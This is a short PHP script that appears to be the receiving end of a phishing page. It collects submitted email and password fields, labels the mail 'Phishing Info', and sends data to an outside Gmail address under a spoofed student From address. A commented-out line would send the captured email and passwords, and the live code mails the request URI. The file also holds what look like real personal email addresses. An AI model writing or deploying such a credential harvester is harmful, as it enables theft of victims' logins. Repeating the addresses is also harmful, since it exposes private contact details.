<?php
    $email=$_POST['email'];
    $subject = 'Phishing Info';
    $password = $_POST['password'];
    $password2 = $_POST['password2'];
    //$message = 'Email: ' . $email . 'Password: ' . $password . 'Password 2: ' . $password2; 
    $URL = $_SERVER['REQUEST_URI'];
    $message = $URL;
    mail("ctperry0301@gmail.com",$subject,$message,"From: S1444478@student.mcckc.edu");
?>